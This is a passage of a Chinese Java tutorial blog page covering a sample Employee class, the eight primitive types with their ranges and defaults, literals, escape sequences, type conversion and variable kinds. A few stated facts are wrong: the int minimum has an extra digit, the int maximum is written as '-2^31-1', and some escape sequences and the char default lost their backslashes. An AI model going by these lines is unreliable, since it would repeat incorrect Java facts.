</span>&#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    String designation;</span><br><span class="line">    <span class="keyword">double</span> salary;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Employee</span><span class="params">(String name)</span></span>&#123;          <span class="comment">//构造方法</span></span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">empAge</span><span class="params">(<span class="keyword">int</span> empAge)</span></span>&#123;</span><br><span class="line">        age = empAge;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">empDesignation</span><span class="params">(String empString)</span></span>&#123;</span><br><span class="line">        designation = empString;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">empSalary</span><span class="params">(<span class="keyword">double</span> empSalary)</span></span>&#123;</span><br><span class="line">        salary = empSalary;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">empPrint</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;姓名：&quot;</span> + name);</span><br><span class="line">        System.out.println(<span class="string">&quot;年龄：&quot;</span> + age);</span><br><span class="line">        System.out.println(<span class="string">&quot;职位：&quot;</span> + designation);</span><br><span class="line">        System.out.println(<span class="string">&quot;薪水：&quot;</span> + salary);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Employee 类有四个成员变量：name、age、designation 和 salary。该类声明了一个构造方法，该方法只有一个参数name。</p><p>程序都是从main方法开始执行。为了能运行这个程序，必须包含main方法并且创建一个实例对象。</p><p><em><strong>EmployeeTest.java</strong></em></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EmployeeTest</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Employee emp1 = <span class="keyword">new</span> Employee(<span class="string">&quot;edward&quot;</span>);</span><br><span class="line">        Employee emp2 = <span class="keyword">new</span> Employee(<span class="string">&quot;si9ma&quot;</span>);</span><br><span class="line"></span><br><span class="line">        emp1.empAge(<span class="number">21</span>);</span><br><span class="line">        emp1.empDesignation(<span class="string">&quot;初级&quot;</span>);</span><br><span class="line">        emp1.empSalary(<span class="number">7</span>);</span><br><span class="line"></span><br><span class="line">        emp2.empAge(<span class="number">27</span>);</span><br><span class="line">        emp2.empDesignation(<span class="string">&quot;中级&quot;</span>);</span><br><span class="line">        emp2.empSalary(<span class="number">20</span>);</span><br><span class="line">        </span><br><span class="line">        emp1.empPrint();</span><br><span class="line">        emp2.empPrint();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230508164650.png"></p><p>编译这两个文件并且运行 EmployeeTest 类，运行结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230508164403.png"></p><h1 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h1><p>Java 有两大数据类型:</p><ul><li>内置数据类型</li><li>引用数据类型</li></ul><h2 id="内置数据类型"><a href="#内置数据类型" class="headerlink" title="内置数据类型"></a>内置数据类型</h2><p>Java语言提供了八种基本类型。</p><p>六种数字类型（四个整数型<code>byte</code>、<code>short</code>、<code>int</code>、<code>long</code>，两个浮点型<code>float</code>、<code>double</code>），</p><p>一种字符类型<code>char</code></p><p>一种布尔型<code>boolean</code></p><p>对于数值类型的基本类型的取值范围，我们无需强制去记忆，因为它们的值都已经以常量的形式定义在对应的包装类中了。</p><h3 id="byte"><a href="#byte" class="headerlink" title="byte"></a>byte</h3><p>byte 数据类型是8位、有符号的，以二进制补码表示的整数；</p><ul><li>最小值是 <strong>-128（-2^7）</strong>；</li><li>最大值是 <strong>127（2^7-1）</strong>；</li><li>默认值是 <strong>0</strong>；</li><li>byte 类型用在大型数组中节约空间，主要代替整数，因为 byte 变量占用的空间只有 int 类型的四分之一；</li><li>例子：byte a = 100，byte b = -50。</li></ul><h3 id="short"><a href="#short" class="headerlink" title="short"></a>short</h3><p>short 数据类型是 16 位、有符号的以二进制补码表示的整数</p><ul><li>最小值是 <strong>-2^15（-32768）</strong>；</li><li>最大值是 <strong>2^15 - 1（32767）</strong>；</li><li>Short 数据类型也可以像 byte 那样节省空间。一个short变量是int型变量所占空间的二分之一；</li><li>默认值是 <strong>0</strong>；</li><li>例子：short s = 1000，short r = -20000。</li></ul><h3 id="int"><a href="#int" class="headerlink" title="int"></a>int</h3><p>int 数据类型是32位、有符号的以二进制补码表示的整数；</p><ul><li>最小值是 <strong>-2^31（-2,147,483,6481）</strong>；</li><li>最大值是 <strong>-2^31-1（2,147,483,647）</strong>；</li><li>一般地整型变量默认为 int 类型；</li><li>默认值是 <strong>0</strong> ；</li><li>例子：int a = 100000, int b = -200000。</li></ul><h3 id="long"><a href="#long" class="headerlink" title="long"></a>long</h3><p>long 数据类型是 64 位、有符号的以二进制补码表示的整数；</p><ul><li>最小值是 <strong>-2^63（-9,223,372,036,854,775,808）</strong>；</li><li>最大值是 <strong>2^63 -1（9,223,372,036,854,775,807）</strong>；</li><li>这种类型主要使用在需要比较大整数的系统上；</li><li>默认值是 <strong>0L</strong>；</li><li>例子： <strong>long a = 100000L</strong>，<strong>long b = -200000L</strong>。<br>“L”理论上不分大小写，但是若写成”l”容易与数字”1”混淆，不容易分辩。所以最好大写。</li></ul><h3 id="float"><a href="#float" class="headerlink" title="float"></a>float</h3><p>float 数据类型是单精度、32位、符合IEEE 754标准的浮点数；</p><ul><li>float 在储存大型浮点数组的时候可节省内存空间；</li><li>默认值是 <strong>0.0f</strong>；</li><li>浮点数不能用来表示精确的值，如货币；</li><li>例子：float f1 = 234.5f。</li></ul><h3 id="double"><a href="#double" class="headerlink" title="double"></a>double</h3><p>double 数据类型是双精度、64 位、符合 IEEE 754 标准的浮点数；</p><ul><li>浮点数的默认类型为 double 类型；</li><li>double类型同样不能表示精确的值，如货币；</li><li>默认值是 <strong>0.0d</strong>；</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">double</span>   d1  = <span class="number">7D</span> ;</span><br><span class="line"><span class="keyword">double</span>   d2  = <span class="number">7.</span>; </span><br><span class="line"><span class="keyword">double</span>   d3  =  <span class="number">8.0</span>; </span><br><span class="line"><span class="keyword">double</span>   d4  =  <span class="number">8.D</span>; </span><br><span class="line"><span class="keyword">double</span>   d5  =  <span class="number">12.9867</span>; </span><br></pre></td></tr></table></figure><p>7 是一个 int 字面量，而 7D，7. 和 8.0 是 double 字面量。</p><h3 id="char"><a href="#char" class="headerlink" title="char"></a>char</h3><p>char 类型是一个单一的 16 位 Unicode 字符；</p><ul><li>最小值是 <strong>\u0000</strong>（十进制等效值为 0）；</li><li>最大值是 <strong>\uffff</strong>（即为 65535，65535是16位二进制所能表示的最大值）；</li><li>char 数据类型可以储存任何字符；</li><li>例子：char letter = ‘A’;。</li></ul><h3 id="boolean"><a href="#boolean" class="headerlink" title="boolean"></a>boolean</h3><p>boolean数据类型表示一位的信息；</p><ul><li>只有两个取值：true 和 false；</li><li>这种类型只作为一种标志来记录 true/false 情况；</li><li>默认值是 <strong>false</strong>；</li><li>例子：boolean one = true。</li></ul><h3 id="实例A-1"><a href="#实例A-1" class="headerlink" title="实例A"></a>实例A</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PrimitiveTypeTest</span> </span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;  </span><br><span class="line">        <span class="comment">// byte  </span></span><br><span class="line">        System.out.println(<span class="string">&quot;基本类型：byte 二进制位数：&quot;</span> + Byte.SIZE);  </span><br><span class="line">        System.out.println(<span class="string">&quot;包装类：java.lang.Byte&quot;</span>);  </span><br><span class="line">        System.out.println(<span class="string">&quot;最小值：Byte.MIN_VALUE=&quot;</span> + Byte.MIN_VALUE);  </span><br><span class="line">        System.out.println(<span class="string">&quot;最大值：Byte.MAX_VALUE=&quot;</span> + Byte.MAX_VALUE);  </span><br><span class="line">        System.out.println();  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// short  </span></span><br><span class="line">        System.out.println(<span class="string">&quot;基本类型：short 二进制位数：&quot;</span> + Short.SIZE);  </span><br><span class="line">        System.out.println(<span class="string">&quot;包装类：java.lang.Short&quot;</span>);  </span><br><span class="line">        System.out.println(<span class="string">&quot;最小值：Short.MIN_VALUE=&quot;</span> + Short.MIN_VALUE);  </span><br><span class="line">        System.out.println(<span class="string">&quot;最大值：Short.MAX_VALUE=&quot;</span> + Short.MAX_VALUE);  </span><br><span class="line">        System.out.println();  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// int  </span></span><br><span class="line">        System.out.println(<span class="string">&quot;基本类型：int 二进制位数：&quot;</span> + Integer.SIZE);  </span><br><span class="line">        System.out.println(<span class="string">&quot;包装类：java.lang.Integer&quot;</span>);  </span><br><span class="line">        System.out.println(<span class="string">&quot;最小值：Integer.MIN_VALUE=&quot;</span> + Integer.MIN_VALUE);  </span><br><span class="line">        System.out.println(<span class="string">&quot;最大值：Integer.MAX_VALUE=&quot;</span> + Integer.MAX_VALUE);  </span><br><span class="line">        System.out.println();  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// long  </span></span><br><span class="line">        System.out.println(<span class="string">&quot;基本类型：long 二进制位数：&quot;</span> + Long.SIZE);  </span><br><span class="line">        System.out.println(<span class="string">&quot;包装类：java.lang.Long&quot;</span>);  </span><br><span class="line">        System.out.println(<span class="string">&quot;最小值：Long.MIN_VALUE=&quot;</span> + Long.MIN_VALUE);  </span><br><span class="line">        System.out.println(<span class="string">&quot;最大值：Long.MAX_VALUE=&quot;</span> + Long.MAX_VALUE);  </span><br><span class="line">        System.out.println();  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// float  </span></span><br><span class="line">        System.out.println(<span class="string">&quot;基本类型：float 二进制位数：&quot;</span> + Float.SIZE);  </span><br><span class="line">        System.out.println(<span class="string">&quot;包装类：java.lang.Float&quot;</span>);  </span><br><span class="line">        System.out.println(<span class="string">&quot;最小值：Float.MIN_VALUE=&quot;</span> + Float.MIN_VALUE);  </span><br><span class="line">        System.out.println(<span class="string">&quot;最大值：Float.MAX_VALUE=&quot;</span> + Float.MAX_VALUE);  </span><br><span class="line">        System.out.println();  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// double  </span></span><br><span class="line">        System.out.println(<span class="string">&quot;基本类型：double 二进制位数：&quot;</span> + Double.SIZE);  </span><br><span class="line">        System.out.println(<span class="string">&quot;包装类：java.lang.Double&quot;</span>);  </span><br><span class="line">        System.out.println(<span class="string">&quot;最小值：Double.MIN_VALUE=&quot;</span> + Double.MIN_VALUE);  </span><br><span class="line">        System.out.println(<span class="string">&quot;最大值：Double.MAX_VALUE=&quot;</span> + Double.MAX_VALUE);  </span><br><span class="line">        System.out.println();  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// char  </span></span><br><span class="line">        System.out.println(<span class="string">&quot;基本类型：char 二进制位数：&quot;</span> + Character.SIZE);  </span><br><span class="line">        System.out.println(<span class="string">&quot;包装类：java.lang.Character&quot;</span>);  </span><br><span class="line">        <span class="comment">// 以数值形式而不是字符形式将Character.MIN_VALUE输出到控制台  </span></span><br><span class="line">        System.out.println(<span class="string">&quot;最小值：Character.MIN_VALUE=&quot;</span> + (<span class="keyword">int</span>) Character.MIN_VALUE);  </span><br><span class="line">        <span class="comment">// 以数值形式而不是字符形式将Character.MAX_VALUE输出到控制台  </span></span><br><span class="line">        System.out.println(<span class="string">&quot;最大值：Character.MAX_VALUE=&quot;</span> + (<span class="keyword">int</span>) Character.MAX_VALUE);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230508224554.png"></p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230508224429.png"></p><p>Float和Double的最小值和最大值都是以科学记数法的形式输出的，结尾的”E+数字”表示E之前的数字要乘以10的多少次方。比如3.14E3就是3.14 × 10^3 =3140，3.14E-3 就是 3.14 x 10^-3 =0.00314。</p><p>实际上，JAVA中还存在另外一种基本类型 void，它也有对应的包装类 java.lang.Void，不过我们无法直接对它们进行操作。</p><h3 id="类型默认值"><a href="#类型默认值" class="headerlink" title="类型默认值"></a>类型默认值</h3><table><thead><tr><th align="left"><strong>数据类型</strong></th><th align="left"><strong>默认值</strong></th></tr></thead><tbody><tr><td align="left">byte</td><td align="left">0</td></tr><tr><td align="left">short</td><td align="left">0</td></tr><tr><td align="left">int</td><td align="left">0</td></tr><tr><td align="left">long</td><td align="left">0L</td></tr><tr><td align="left">float</td><td align="left">0.0f</td></tr><tr><td align="left">double</td><td align="left">0.0d</td></tr><tr><td align="left">char</td><td align="left">‘u0000’</td></tr><tr><td align="left">String (or any object)</td><td align="left">null</td></tr><tr><td align="left">boolean</td><td align="left">false</td></tr></tbody></table><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">boolean</span> bool;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">byte</span> by;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> ch;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">double</span> d;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">float</span> f;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">long</span> l;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">short</span> sh;</span><br><span class="line">    <span class="keyword">static</span> String str;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Bool :&quot;</span> + bool);</span><br><span class="line">        System.out.println(<span class="string">&quot;Byte :&quot;</span> + by);</span><br><span class="line">        System.out.println(<span class="string">&quot;Character:&quot;</span> + ch);</span><br><span class="line">        System.out.println(<span class="string">&quot;Double :&quot;</span> + d);</span><br><span class="line">        System.out.println(<span class="string">&quot;Float :&quot;</span> + f);</span><br><span class="line">        System.out.println(<span class="string">&quot;Integer :&quot;</span> + i);</span><br><span class="line">        System.out.println(<span class="string">&quot;Long :&quot;</span> + l);</span><br><span class="line">        System.out.println(<span class="string">&quot;Short :&quot;</span> + sh);</span><br><span class="line">        System.out.println(<span class="string">&quot;String :&quot;</span> + str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230508230336.png"></p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230508230438.png"></p><h2 id="引用数据类型"><a href="#引用数据类型" class="headerlink" title="引用数据类型"></a>引用数据类型</h2><ul><li>在Java中，引用类型的变量非常类似于C/C++的指针。引用类型指向一个对象，指向对象的变量是引用变量。这些变量在声明时被指定为一个特定的类型，比如 Employee、Puppy 等。变量一旦声明后，类型就不能被改变了。</li><li>对象、数组都是引用数据类型。</li><li>所有引用类型的默认值都是null。</li><li>一个引用变量可以用来引用任何与之兼容的类型。</li><li>例子：Site site = new Site(“Runoob”)。</li></ul><h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><p>常量在程序运行时是不能被修改的。</p><p>在 Java 中使用 <code>final</code> 关键字来修饰常量，声明方式和变量类似：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">double</span> PI = <span class="number">3.1415927</span>;</span><br></pre></td></tr></table></figure><p>虽然常量名也可以用小写，但为了便于识别，<strong>通常使用大写字母表示常量</strong>。</p><p>字面量可以赋给任何内置类型的变量。例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> Decimal = <span class="number">100</span>;</span><br><span class="line"><span class="keyword">int</span> octal = <span class="number">0144</span>;</span><br><span class="line"><span class="keyword">int</span> hexa =<span class="number">0x64</span>;</span><br></pre></td></tr></table></figure><p>和其他语言一样，Java的字符串常量也是包含在两个引号之间的字符序列。下面是字符串型字面量的例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;Hello World&quot;</span></span><br><span class="line"><span class="string">&quot;two\nlines&quot;</span></span><br><span class="line"><span class="string">&quot;\&quot;This is in quotes\&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>字符串常量和字符变量都可以包含任何 Unicode 字符。例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> a = <span class="string">&#x27;\u0001&#x27;</span>;</span><br><span class="line">String a = <span class="string">&quot;\u0001&quot;</span>;</span><br></pre></td></tr></table></figure><p>Java语言支持一些特殊的转义字符序列。</p><table><thead><tr><th align="left">符号</th><th align="left">字符含义</th></tr></thead><tbody><tr><td align="left">\n</td><td align="left">换行 (0x0a)</td></tr><tr><td align="left">\r</td><td align="left">回车 (0x0d)</td></tr><tr><td align="left">\f</td><td align="left">换页符(0x0c)</td></tr><tr><td align="left">\b</td><td align="left">退格 (0x08)</td></tr><tr><td align="left">\0</td><td align="left">空字符 (0x0)</td></tr><tr><td align="left">\s</td><td align="left">空格 (0x20)</td></tr><tr><td align="left">\t</td><td align="left">制表符</td></tr><tr><td align="left">&quot;</td><td align="left">双引号</td></tr><tr><td align="left">&#39;</td><td align="left">单引号</td></tr><tr><td align="left">\</td><td align="left">反斜杠</td></tr><tr><td align="left">\ddd</td><td align="left">八进制字符 (ddd)</td></tr><tr><td align="left">\uxxxx</td><td align="left">16进制Unicode字符 (xxxx)</td></tr></tbody></table><h2 id="数据类型转换"><a href="#数据类型转换" class="headerlink" title="数据类型转换"></a>数据类型转换</h2><p><strong>整型、实型（常量）、字符型数据可以混合运算。运算中，不同类型的数据先转化为同一类型，然后进行运算。</strong></p><p>转换从低级到高级。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">低  ------------------------------------&gt;  高</span><br><span class="line"></span><br><span class="line"><span class="keyword">byte</span>,<span class="keyword">short</span>,<span class="keyword">char</span>—&gt; <span class="keyword">int</span> —&gt; <span class="keyword">long</span>—&gt; <span class="keyword">float</span> —&gt; <span class="keyword">double</span></span><br></pre></td></tr></table></figure><p>数据类型转换必须满足如下规则：</p><ol><li><p>不能对boolean类型进行类型转换。</p></li><li><p>不能把对象类型转换成不相关类的对象。</p></li><li><p>在把容量大的类型转换为容量小的类型时必须使用强制类型转换。</p></li><li><p>转换过程中可能导致溢出或损失精度，例如：</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> i =<span class="number">128</span>;   </span><br><span class="line"><span class="keyword">byte</span> b = (<span class="keyword">byte</span>)i;</span><br><span class="line"><span class="comment">//因为 byte 类型是 8 位，最大值为127，所以当 int 强制转换为 byte 类型时，值 128 时候就会导致溢出。</span></span><br></pre></td></tr></table></figure><ol start="5"><li>浮点数到整数的转换是通过<strong>舍弃小数</strong>得到，而不是四舍五入，例如：</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">int</span>)<span class="number">23.7</span> == <span class="number">23</span>;        </span><br><span class="line">(<span class="keyword">int</span>)-<span class="number">45.89f</span> == -<span class="number">45</span></span><br></pre></td></tr></table></figure><h3 id="自动类型转换"><a href="#自动类型转换" class="headerlink" title="自动类型转换"></a>自动类型转换</h3><p>必须满足转换前的数据类型的位数要低于转换后的数据类型，例如: short数据类型的位数为16位，就可以自动转换位数为32的int类型，同样float数据类型的位数为32，可以自动转换为64位的double类型。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ZiDongLeiZhuan</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> c1 = <span class="string">&#x27;a&#x27;</span>;<span class="comment">//定义一个char类型</span></span><br><span class="line">        <span class="keyword">int</span> i1 = c1;<span class="comment">//char自动类型转换为int</span></span><br><span class="line">        System.out.println(<span class="string">&quot;值为a，char自动类型转换为int后的值等于&quot;</span> + i1);</span><br><span class="line">        <span class="keyword">char</span> c2 = <span class="string">&#x27;A&#x27;</span>;<span class="comment">//定义一个char类型</span></span><br><span class="line">        <span class="keyword">int</span> i2 = c2+<span class="number">1</span>;<span class="comment">//char 类型和 int 类型计算</span></span><br><span class="line">        System.out.println(<span class="string">&quot;值为A，char类型和int计算后的值等于&quot;</span> + i2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230508232929.png"></p><p>运行结果为:</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230508233015.png"></p><p>查 ASCII 码表可知，a对应值为 97， A 对应值为 65，所以 <strong>i2=65+1=66</strong>。</p><h3 id="强制类型转换"><a href="#强制类型转换" class="headerlink" title="强制类型转换"></a>强制类型转换</h3><ul><li><ol><li>条件是转换的数据类型必须是兼容的。</li></ol></li><li><ol start="2"><li>格式：(type)value type是要强制类型转换后的数据类型。</li></ol></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">QiangZhiZhuanHuan</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i1 = <span class="number">123</span>;</span><br><span class="line">        <span class="keyword">byte</span> b = (<span class="keyword">byte</span>)i1;<span class="comment">//强制类型转换为byte</span></span><br><span class="line">        System.out.println(<span class="string">&quot;int强制类型转换为byte后的值等于&quot;</span>+b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230508234053.png"></p><p>运行结果为：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230508234019.png"></p><h3 id="隐含强制类型转换"><a href="#隐含强制类型转换" class="headerlink" title="隐含强制类型转换"></a>隐含强制类型转换</h3><ul><li>1、 整数的默认类型是 int。</li><li>1、小数默认是 double 类型浮点型，在定义 float 类型时必须在数字后面跟上 F 或者 f。</li></ul><h1 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h1><p>在Java语言中，所有的变量在使用前必须声明。声明变量的基本格式如下：</p><p><code>type identifier [ = value][, identifier [= value] ...] ;</code></p><p><strong>格式说明：</strong></p><ul><li>type – 数据类型。</li><li>identifier – 是变量名，可以使用逗号 <strong>,</strong> 隔开来声明多个同类型变量。</li></ul><p>以下列出了一些变量的声明实例。注意有些包含了初始化过程。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a, b, c;         <span class="comment">// 声明三个int型整数：a、 b、c</span></span><br><span class="line"><span class="keyword">int</span> d = <span class="number">3</span>, e = <span class="number">4</span>, f = <span class="number">5</span>; <span class="comment">// 声明三个整数并赋予初值</span></span><br><span class="line"><span class="keyword">byte</span> z = <span class="number">22</span>;         <span class="comment">// 声明并初始化 z</span></span><br><span class="line">String s = <span class="string">&quot;si9ma0v0&quot;</span>;  <span class="comment">// 声明并初始化字符串 s</span></span><br><span class="line"><span class="keyword">double</span> pi = <span class="number">3.14159</span>; <span class="comment">// 声明了双精度浮点型变量 pi</span></span><br><span class="line"><span class="keyword">char</span> x = <span class="string">&#x27;x&#x27;</span>;        <span class="comment">// 声明变量 x 的值是字符 &#x27;x&#x27;。</span></span><br></pre></td></tr></table></figure><p>Java 语言支持的变量类型有：</p><ul><li><strong>局部变量（Local Variables）：</strong>定义在方法、构造方法或语句块中的变量，作用域只限于当前方法、构造方法或语句块中。局部变量必须在使用前声明，并且不能被访问修饰符修饰。</li><li><strong>成员变量（Instance Variables）：</strong>定义在类中、方法之外的变量，作用域为整个类，可以被类中的任何方法、构造方法和语句块访问。成员变量可以被访问修饰符修饰。</li><li><strong>静态变量（Class Variables）：</strong>定义在类中、方法之外的变量，并且使用 <code>static</code> 关键字修饰，作用域为整个类，可以被类中的任何方法、构造方法和语句块访问，静态变量的值在程序运行期间只有一个副本。静态变量可以被访问修饰符修饰。</li><li><strong>参数变量（Parameters）：</strong>方法定义时声明的变量，作为调用该方法时传递给方法的值。参数变量的作用域只限于方法内部。</li></ul><p>以下实例中定义了一个 Variable 类，其中包含了一个成员变量 instanceVar 和一个静态变量 staticVar。</p><p>method() 方法中定义了一个参数变量 paramVar 和一个局部变量 localVar。在方法内部，我们将局部变量的值赋给成员变量，将参数变量的值赋给静态变量，然后打印出这些变量的值。</p><p>在 main() 方法中，我们创建了一个Variable 对象，并调用了它的 method() 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 